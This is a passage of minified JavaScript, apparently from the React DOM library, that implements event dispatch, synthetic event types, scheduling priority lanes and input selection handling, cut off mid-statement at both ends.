nb=q({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ya(e,n){if(n){if(nb[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(r(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(r(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(r(61))}if(n.style!=null&&typeof n.style!="object")throw Error(r(62))}}function ba(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var va=null;function wa(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var ka=null,vi=null,wi=null;function Xd(e){if(e=_r(e)){if(typeof ka!="function")throw Error(r(280));var n=e.stateNode;n&&(n=Vs(n),ka(e.stateNode,e.type,n))}}function Zd(e){vi?wi?wi.push(e):wi=[e]:vi=e}function eu(){if(vi){var e=vi,n=wi;if(wi=vi=null,Xd(e),n)for(e=0;e<n.length;e++)Xd(n[e])}}function tu(e,n){return e(n)}function nu(){}var xa=!1;function iu(e,n,o){if(xa)return e(n,o);xa=!0;try{return tu(e,n,o)}finally{xa=!1,(vi!==null||wi!==null)&&(nu(),eu())}}function cr(e,n){var o=e.stateNode;if(o===null)return null;var l=Vs(o);if(l===null)return null;o=l[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(l=!l.disabled)||(e=e.type,l=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!l;break e;default:e=!1}if(e)return null;if(o&&typeof o!="function")throw Error(r(231,n,typeof o));return o}var Ta=!1;if(h)try{var dr={};Object.defineProperty(dr,"passive",{get:function(){Ta=!0}}),window.addEventListener("test",dr,dr),window.removeEventListener("test",dr,dr)}catch{Ta=!1}function ib(e,n,o,l,u,g,b,k,A){var j=Array.prototype.slice.call(arguments,3);try{n.apply(o,j)}catch(F){this.onError(F)}}var ur=!1,vs=null,ws=!1,Sa=null,rb={onError:function(e){ur=!0,vs=e}};function sb(e,n,o,l,u,g,b,k,A){ur=!1,vs=null,ib.apply(rb,arguments)}function ob(e,n,o,l,u,g,b,k,A){if(sb.apply(this,arguments),ur){if(ur){var j=vs;ur=!1,vs=null}else throw Error(r(198));ws||(ws=!0,Sa=j)}}function Un(e){var n=e,o=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,(n.flags&4098)!==0&&(o=n.return),e=n.return;while(e)}return n.tag===3?o:null}function ru(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function su(e){if(Un(e)!==e)throw Error(r(188))}function ab(e){var n=e.alternate;if(!n){if(n=Un(e),n===null)throw Error(r(188));return n!==e?null:e}for(var o=e,l=n;;){var u=o.return;if(u===null)break;var g=u.alternate;if(g===null){if(l=u.return,l!==null){o=l;continue}break}if(u.child===g.child){for(g=u.child;g;){if(g===o)return su(u),e;if(g===l)return su(u),n;g=g.sibling}throw Error(r(188))}if(o.return!==l.return)o=u,l=g;else{for(var b=!1,k=u.child;k;){if(k===o){b=!0,o=u,l=g;break}if(k===l){b=!0,l=u,o=g;break}k=k.sibling}if(!b){for(k=g.child;k;){if(k===o){b=!0,o=g,l=u;break}if(k===l){b=!0,l=g,o=u;break}k=k.sibling}if(!b)throw Error(r(189))}}if(o.alternate!==l)throw Error(r(190))}if(o.tag!==3)throw Error(r(188));return o.stateNode.current===o?e:n}function ou(e){return e=ab(e),e!==null?au(e):null}function au(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=au(e);if(n!==null)return n;e=e.sibling}return null}var lu=t.unstable_scheduleCallback,cu=t.unstable_cancelCallback,lb=t.unstable_shouldYield,cb=t.unstable_requestPaint,ze=t.unstable_now,db=t.unstable_getCurrentPriorityLevel,Aa=t.unstable_ImmediatePriority,du=t.unstable_UserBlockingPriority,ks=t.unstable_NormalPriority,ub=t.unstable_LowPriority,uu=t.unstable_IdlePriority,xs=null,Gt=null;function hb(e){if(Gt&&typeof Gt.onCommitFiberRoot=="function")try{Gt.onCommitFiberRoot(xs,e,void 0,(e.current.flags&128)===128)}catch{}}var Ot=Math.clz32?Math.clz32:gb,pb=Math.log,fb=Math.LN2;function gb(e){return e>>>=0,e===0?32:31-(pb(e)/fb|0)|0}var Ts=64,Ss=4194304;function hr(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function As(e,n){var o=e.pendingLanes;if(o===0)return 0;var l=0,u=e.suspendedLanes,g=e.pingedLanes,b=o&268435455;if(b!==0){var k=b&~u;k!==0?l=hr(k):(g&=b,g!==0&&(l=hr(g)))}else b=o&~u,b!==0?l=hr(b):g!==0&&(l=hr(g));if(l===0)return 0;if(n!==0&&n!==l&&(n&u)===0&&(u=l&-l,g=n&-n,u>=g||u===16&&(g&4194240)!==0))return n;if((l&4)!==0&&(l|=o&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=l;0<n;)o=31-Ot(n),u=1<<o,l|=e[o],n&=~u;return l}function mb(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function yb(e,n){for(var o=e.suspendedLanes,l=e.pingedLanes,u=e.expirationTimes,g=e.pendingLanes;0<g;){var b=31-Ot(g),k=1<<b,A=u[b];A===-1?((k&o)===0||(k&l)!==0)&&(u[b]=mb(k,n)):A<=n&&(e.expiredLanes|=k),g&=~k}}function Ca(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function hu(){var e=Ts;return Ts<<=1,(Ts&4194240)===0&&(Ts=64),e}function Ea(e){for(var n=[],o=0;31>o;o++)n.push(e);return n}function pr(e,n,o){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Ot(n),e[n]=o}function bb(e,n){var o=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var l=e.eventTimes;for(e=e.expirationTimes;0<o;){var u=31-Ot(o),g=1<<u;n[u]=0,l[u]=-1,e[u]=-1,o&=~g}}function Pa(e,n){var o=e.entangledLanes|=n;for(e=e.entanglements;o;){var l=31-Ot(o),u=1<<l;u&n|e[l]&n&&(e[l]|=n),o&=~u}}var Se=0;function pu(e){return e&=-e,1<e?4<e?(e&268435455)!==0?16:536870912:4:1}var fu,Ia,gu,mu,yu,_a=!1,Cs=[],pn=null,fn=null,gn=null,fr=new Map,gr=new Map,mn=[],vb="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function bu(e,n){switch(e){case"focusin":case"focusout":pn=null;break;case"dragenter":case"dragleave":fn=null;break;case"mouseover":case"mouseout":gn=null;break;case"pointerover":case"pointerout":fr.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":gr.delete(n.pointerId)}}function mr(e,n,o,l,u,g){return e===null||e.nativeEvent!==g?(e={blockedOn:n,domEventName:o,eventSystemFlags:l,nativeEvent:g,targetContainers:[u]},n!==null&&(n=_r(n),n!==null&&Ia(n)),e):(e.eventSystemFlags|=l,n=e.targetContainers,u!==null&&n.indexOf(u)===-1&&n.push(u),e)}function wb(e,n,o,l,u){switch(n){case"focusin":return pn=mr(pn,e,n,o,l,u),!0;case"dragenter":return fn=mr(fn,e,n,o,l,u),!0;case"mouseover":return gn=mr(gn,e,n,o,l,u),!0;case"pointerover":var g=u.pointerId;return fr.set(g,mr(fr.get(g)||null,e,n,o,l,u)),!0;case"gotpointercapture":return g=u.pointerId,gr.set(g,mr(gr.get(g)||null,e,n,o,l,u)),!0}return!1}function vu(e){var n=Wn(e.target);if(n!==null){var o=Un(n);if(o!==null){if(n=o.tag,n===13){if(n=ru(o),n!==null){e.blockedOn=n,yu(e.priority,function(){gu(o)});return}}else if(n===3&&o.stateNode.current.memoizedState.isDehydrated){e.blockedOn=o.tag===3?o.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Es(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var o=Da(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(o===null){o=e.nativeEvent;var l=new o.constructor(o.type,o);va=l,o.target.dispatchEvent(l),va=null}else return n=_r(o),n!==null&&Ia(n),e.blockedOn=o,!1;n.shift()}return!0}function wu(e,n,o){Es(e)&&o.delete(n)}function kb(){_a=!1,pn!==null&&Es(pn)&&(pn=null),fn!==null&&Es(fn)&&(fn=null),gn!==null&&Es(gn)&&(gn=null),fr.forEach(wu),gr.forEach(wu)}function yr(e,n){e.blockedOn===n&&(e.blockedOn=null,_a||(_a=!0,t.unstable_scheduleCallback(t.unstable_NormalPriority,kb)))}function br(e){function n(u){return yr(u,e)}if(0<Cs.length){yr(Cs[0],e);for(var o=1;o<Cs.length;o++){var l=Cs[o];l.blockedOn===e&&(l.blockedOn=null)}}for(pn!==null&&yr(pn,e),fn!==null&&yr(fn,e),gn!==null&&yr(gn,e),fr.forEach(n),gr.forEach(n),o=0;o<mn.length;o++)l=mn[o],l.blockedOn===e&&(l.blockedOn=null);for(;0<mn.length&&(o=mn[0],o.blockedOn===null);)vu(o),o.blockedOn===null&&mn.shift()}var ki=O.ReactCurrentBatchConfig,Ps=!0;function xb(e,n,o,l){var u=Se,g=ki.transition;ki.transition=null;try{Se=1,Ra(e,n,o,l)}finally{Se=u,ki.transition=g}}function Tb(e,n,o,l){var u=Se,g=ki.transition;ki.transition=null;try{Se=4,Ra(e,n,o,l)}finally{Se=u,ki.transition=g}}function Ra(e,n,o,l){if(Ps){var u=Da(e,n,o,l);if(u===null)Ja(e,n,l,Is,o),bu(e,l);else if(wb(u,e,n,o,l))l.stopPropagation();else if(bu(e,l),n&4&&-1<vb.indexOf(e)){for(;u!==null;){var g=_r(u);if(g!==null&&fu(g),g=Da(e,n,o,l),g===null&&Ja(e,n,l,Is,o),g===u)break;u=g}u!==null&&l.stopPropagation()}else Ja(e,n,l,null,o)}}var Is=null;function Da(e,n,o,l){if(Is=null,e=wa(l),e=Wn(e),e!==null)if(n=Un(e),n===null)e=null;else if(o=n.tag,o===13){if(e=ru(n),e!==null)return e;e=null}else if(o===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Is=e,null}function ku(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(db()){case Aa:return 1;case du:return 4;case ks:case ub:return 16;case uu:return 536870912;default:return 16}default:return 16}}var yn=null,Ma=null,_s=null;function xu(){if(_s)return _s;var e,n=Ma,o=n.length,l,u="value"in yn?yn.value:yn.textContent,g=u.length;for(e=0;e<o&&n[e]===u[e];e++);var b=o-e;for(l=1;l<=b&&n[o-l]===u[g-l];l++);return _s=u.slice(e,1<l?1-l:void 0)}function Rs(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function Ds(){return!0}function Tu(){return!1}function bt(e){function n(o,l,u,g,b){this._reactName=o,this._targetInst=u,this.type=l,this.nativeEvent=g,this.target=b,this.currentTarget=null;for(var k in e)e.hasOwnProperty(k)&&(o=e[k],this[k]=o?o(g):g[k]);return this.isDefaultPrevented=(g.defaultPrevented!=null?g.defaultPrevented:g.returnValue===!1)?Ds:Tu,this.isPropagationStopped=Tu,this}return q(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var o=this.nativeEvent;o&&(o.preventDefault?o.preventDefault():typeof o.returnValue!="unknown"&&(o.returnValue=!1),this.isDefaultPrevented=Ds)},stopPropagation:function(){var o=this.nativeEvent;o&&(o.stopPropagation?o.stopPropagation():typeof o.cancelBubble!="unknown"&&(o.cancelBubble=!0),this.isPropagationStopped=Ds)},persist:function(){},isPersistent:Ds}),n}var xi={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ja=bt(xi),vr=q({},xi,{view:0,detail:0}),Sb=bt(vr),Oa,La,wr,Ms=q({},vr,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Na,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==wr&&(wr&&e.type==="mousemove"?(Oa=e.screenX-wr.screenX,La=e.screenY-wr.screenY):La=Oa=0,wr=e),Oa)},movementY:function(e){return"movementY"in e?e.movementY:La}}),Su=bt(Ms),Ab=q({},Ms,{dataTransfer:0}),Cb=bt(Ab),Eb=q({},vr,{relatedTarget:0}),Ba=bt(Eb),Pb=q({},xi,{animationName:0,elapsedTime:0,pseudoElement:0}),Ib=bt(Pb),_b=q({},xi,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Rb=bt(_b),Db=q({},xi,{data:0}),Au=bt(Db),Mb={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},jb={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Ob={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Lb(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=Ob[e])?!!n[e]:!1}function Na(){return Lb}var Bb=q({},vr,{key:function(e){if(e.key){var n=Mb[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=Rs(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?jb[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Na,charCode:function(e){return e.type==="keypress"?Rs(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Rs(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Nb=bt(Bb),Fb=q({},Ms,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Cu=bt(Fb),zb=q({},vr,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Na}),Vb=bt(zb),Ub=q({},xi,{propertyName:0,elapsedTime:0,pseudoElement:0}),Wb=bt(Ub),$b=q({},Ms,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Hb=bt($b),Gb=[9,13,27,32],Fa=h&&"CompositionEvent"in window,kr=null;h&&"documentMode"in document&&(kr=document.documentMode);var qb=h&&"TextEvent"in window&&!kr,Eu=h&&(!Fa||kr&&8<kr&&11>=kr),Pu=" ",Iu=!1;function _u(e,n){switch(e){case"keyup":return Gb.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ru(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Ti=!1;function Kb(e,n){switch(e){case"compositionend":return Ru(n);case"keypress":return n.which!==32?null:(Iu=!0,Pu);case"textInput":return e=n.data,e===Pu&&Iu?null:e;default:return null}}function Jb(e,n){if(Ti)return e==="compositionend"||!Fa&&_u(e,n)?(e=xu(),_s=Ma=yn=null,Ti=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return Eu&&n.locale!=="ko"?null:n.data;default:return null}}var Qb={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Du(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Qb[e.type]:n==="textarea"}function Mu(e,n,o,l){Zd(l),n=Ns(n,"onChange"),0<n.length&&(o=new ja("onChange","change",null,o,l),e.push({event:o,listeners:n}))}var xr=null,Tr=null;function Yb(e){Yu(e,0)}function js(e){var n=Pi(e);if(ua(n))return e}function Xb(e,n){if(e==="change")return n}var ju=!1;if(h){var za;if(h){var Va="oninput"in document;if(!Va){var Ou=document.createElement("div");Ou.setAttribute("oninput","return;"),Va=typeof Ou.oninput=="function"}za=Va}else za=!1;ju=za&&(!document.documentMode||9<document.documentMode)}function Lu(){xr&&(xr.detachEvent("onpropertychange",Bu),Tr=xr=null)}function Bu(e){if(e.propertyName==="value"&&js(Tr)){var n=[];Mu(n,Tr,e,wa(e)),iu(Yb,n)}}function Zb(e,n,o){e==="focusin"?(Lu(),xr=n,Tr=o,xr.attachEvent("onpropertychange",Bu)):e==="focusout"&&Lu()}function ev(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return js(Tr)}function tv(e,n){if(e==="click")return js(n)}function nv(e,n){if(e==="input"||e==="change")return js(n)}function iv(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Lt=typeof Object.is=="function"?Object.is:iv;function Sr(e,n){if(Lt(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var o=Object.keys(e),l=Object.keys(n);if(o.length!==l.length)return!1;for(l=0;l<o.length;l++){var u=o[l];if(!p.call(n,u)||!Lt(e[u],n[u]))return!1}return!0}function Nu(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Fu(e,n){var o=Nu(e);e=0;for(var l;o;){if(o.nodeType===3){if(l=e+o.textContent.length,e<=n&&l>=n)return{node:o,offset:n-e};e=l}e:{for(;o;){if(o.nextSibling){o=o.nextSibling;break e}o=o.parentNode}o=void 0}o=Nu(o)}}function zu(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?zu(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function Vu(){for(var e=window,n=ys();n instanceof e.HTMLIFrameElement;){try{var o=typeof n.contentWindow.location.href=="string"}catch{o=!1}if(o)e=n.contentWindow;else break;n=ys(e.document)}return n}function Ua(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function rv(e){var n=Vu(),o=e.focusedElem,l=e.selectionRange;if(n!==o&&o&&o.ownerDocument&&zu(o.ownerDocument.documentElement,o)){if(l!==null&&Ua(o)){if(n=l.start,e=l.end,e===void 0&&(e=n),"selectionStart"in o)o.selectionStart=n,o.selectionEnd=Math.min(e,o.value.length);else if(e=(n=o.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var u=o.textContent.length,g=Math.min(l.start,u);l=l.end===void 0?g:Math.min(l.end,u),!e.extend&&g>l&&(u=l,l=g,g=u),u=Fu(o,g);var b=Fu(o,l);u&&b&&(e.rangeCount!==1||e.anchorNode!==u.node||e.anchorOffset!==u.offset||e.focusNode!==b.node||e.focusOffset!==b.offset)&&(n=n.createRange(),n.setStart(u.node,u.offset),e.removeAllRanges(),g>l?(e.addRange(n),e.extend(b.node,b.offset)):(n.setEnd(b.node,b.offset),e.addRange(n)))}}for(n=[],e=o;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof o.focus=="function"&&o.focus(),o=0;o<n.length;o++)e=n[o],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var sv=h&&"documentMode"in document&&11>=document.documentMode,Si=null,Wa=null,Ar=null,$a=!1;function Uu(e,n,o){var l=o.window===o?o.document:o.nodeType===9?o:o.ownerDocument;$a||Si==null||Si!==ys(l)||(l=Si,"selectionStart"in l&&Ua(l)?l={start:l.selectionStart,end:l.selectionEnd}:(l=(l.ownerDocument&&l.ownerDocument.defaultView||window).getSelection(),l={anchorNode:l.anchorNode,anchorOffset:l.anchorOffset,focusNode:l.focusNode,focusOffset:l.focusOffset}),Ar&&Sr(Ar,l)||(Ar=l,l=Ns(Wa,"onSelect"),0<l.length&&(n=new ja("onSelect","select",null,n,o),e.push({event:n,listeners:l}),n.target=Si)))}function Os(e,n){var o={};return o[e.toLowerCase()]=n.toLowerCase(),o["Webkit"+e]="webkit"+n,o["Moz"+e]="moz"+n,o}var Ai={animationend:Os("Animation","AnimationEnd"),animationiteration:Os("Animation","AnimationIteration"),animationstart:Os("Animation","AnimationStart"),transitionend:Os("Transition","TransitionEnd")},Ha={},Wu={};h&&(Wu=document.createElement("div").style,"AnimationEvent"in window||(delete Ai.animationend.animation,delete Ai.animationiteration.animation,delete Ai.animationstart.animation),"TransitionEvent"in window||delete Ai.transitionend.transition);function Ls(e){if(Ha[e])return Ha[e];if(!Ai[e])return e;var n=Ai[e],o;for(o in n)if(n.hasOwnProperty(o)&&o in Wu)return Ha[e]=n[o];return e}var $u=Ls("animationend"),Hu=Ls("animationiteration"),Gu=Ls("animationstart"),qu=Ls("transitionend"),Ku=new Map,Ju="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function bn(e,n){Ku.set(e,n),c(n,[e])}for(var Ga=0;Ga<Ju.length;Ga++){var qa=Ju[Ga],ov=qa.toLowerCase(),av=qa[0].toUpperCase()+qa.slice(1);bn(ov,"on"+av)}bn($u,"onAnimationEnd"),bn(Hu,"onAnimationIteration"),bn(Gu,"onAnimationStart"),bn("dblclick","onDoubleClick"),bn("focusin","onFocus"),bn("focusout","onBlur"),bn(qu,"onTransitionEnd"),d("onMouseEnter",["mouseout","mouseover"]),d("onMouseLeave",["mouseout","mouseover"]),d("onPointerEnter",["pointerout","pointerover"]),d("onPointerLeave",["pointerout","pointerover"]),c("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),c("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),c("onBeforeInput",["compositionend","keypress","textInput","paste"]),c("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Cr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),lv=new Set("cancel close invalid load scroll toggle".split(" ").concat(Cr));function Qu(e,n,o){var l=e.type||"unknown-event";e.currentTarget=o,ob(l,n,void 0,e),e.currentTarget=null}function Yu(e,n){n=(n&4)!==0;for(var o=0;o<e.length;o++){var l=e[o],u=l.event;l=l.listeners;e:{var g=void 0;if(n)for(var b=l.length-1;0<=b;b--){var k=l[b],A=k.instance,j=k.currentTarget;if(k=k.listener,A!==g&&u.isPropagationStopped())break e;Qu(u,k,j),g=A}else for(b=0;b<l.length;b++){if(k=l[b],A=k.instance,j=k.currentTarget,k=k.listener,A!==g&&u.isPropagationStopped())break e;Qu(u,k,j),g=A}}}if(ws)throw e=Sa,ws=!1,Sa=null,e}function Re(e,n){var o=n[tl];o===void 0&&(o=n[tl]=new Set);var l=e+"__bubble";o.has(l)||(Xu(n,e,2,!1),o.add(l))}function Ka(e,n,o){var l=0;n&&(l|=4),Xu(o,e,l,n)}var Bs="_reactListening"+Math.random().toString(36).slice(2);function Er(e){if(!e[Bs]){e[Bs]=!0,s.forEach(function(o){o!=="selectionchange"&&(lv.has(o)||Ka(o,!1,e),Ka(o,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[Bs]||(n[Bs]=!0,Ka("selectionchange",!1,n))}}function Xu(e,n,o,l){switch(ku(n)){case 1:var u=xb;break;case 4:u=Tb;break;default:u=Ra}o=u.bind(null,n,o,e),u=void 0,!Ta||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(u=!0),l?u!==void 0?e.addEventListener(n,o,{capture:!0,passive:u}):e.addEventListener(n,o,!0):u!==void 0?e.addEventListener(n,o,{passive:u}):e.addEventListener(n,o,!1)}function Ja(e,n,o,l,u){var g=l;if((n&1)===0&&(n&2)===0&&l!==null)e:for(;;){if(l===null)return;var b=l.tag;if(b===3||b===4){var k=l.stateNode.containerInfo;if(k===u||k.nodeType===8&&k.parentNode===u)break;if(b===4)for(b=l.return;b!==null;){var A=b.tag;if((A===3||A===4)&&(A=b.stateNode.containerInfo,A===u||A.nodeType===8&&A.parentNode===u))return;b=b.return}for(;k!==null;){if(b=Wn(k),b===null)return;if(A=b.tag,A===5||A===6){l=g=b;continue e}k=k.parentNode}}l=l.return}iu(function(){var j=g,F=wa(o),z=[];e:{var N=Ku.get(e);if(N!==void 0){var K=ja,Z=e;switch(e){case"keypress":if(Rs(o)===0)break e;case"keydown":case"keyup":K=Nb;break;case"focusin":Z="focus",K=Ba;break;case"focusout":Z="blur",K=Ba;break;case"beforeblur":case"afterblur":K=Ba;break;case"click":if(o.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":K=Su;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":K=Cb;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":K=Vb;break;case $u:case Hu:case Gu:K=Ib;break;case qu:K=Wb;break;case"scroll":K=Sb;break;case"wheel":K=Hb;break;case"copy":case"cut":case"paste":K=Rb;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":K=Cu}var ee=(n&4)!==0,Ve=!ee&&e==="scroll",_=ee?N!==null?N+"Capture":null:N;ee=[];for(var I=j,D;I!==null;){D=I;var V=D.stateNode;if(D.tag===5&&V!==null&&(D=V,_!==null&&(V=cr(I,_),V!=null&&ee.push(Pr(I,V,D)))),Ve)break;I=I.return}0<ee.length&&(N=new 